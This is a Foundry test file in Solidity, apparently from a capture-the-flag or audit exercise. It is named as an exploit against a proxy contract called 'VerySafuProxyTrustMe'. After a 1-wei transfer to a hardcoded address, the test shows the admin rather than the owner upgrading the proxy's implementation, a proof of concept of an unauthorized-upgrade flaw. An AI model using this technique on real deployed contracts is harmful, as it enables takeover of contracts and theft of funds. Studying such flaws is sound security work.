// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "../src/ERC20.sol";
import {VerySafuProxyTrustMe} from "../src/VerySafu.sol";



contract Exploit is Test {
    VerySafuProxyTrustMe public verysafe;
    ERC20 public erc20;
    address owner = makeAddr('Owner');

    address admin = makeAddr("Admin");

    address newImplementation = makeAddr("newImplementation");


    function setUp() public {
        erc20 = new ERC20();

        vm.prank(admin);

        verysafe = new VerySafuProxyTrustMe(address(erc20), owner);

        ERC20 very = ERC20(address(verysafe));
        vm.prank(owner);
        very.initialize("DVT", "DVT",18, 10000 ether);
        
    }

    function test_upgradeWithoutOwner() public {
        
        vm.prank(owner);
        
        ERC20(address(verysafe)).transfer(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85, 1 wei);

        assertEq(address(erc20), verysafe.implementation());
        vm.prank(admin);
        verysafe.upgrade(newImplementation);
        assertEq(newImplementation, verysafe.implementation());
        

        
    }

    
}
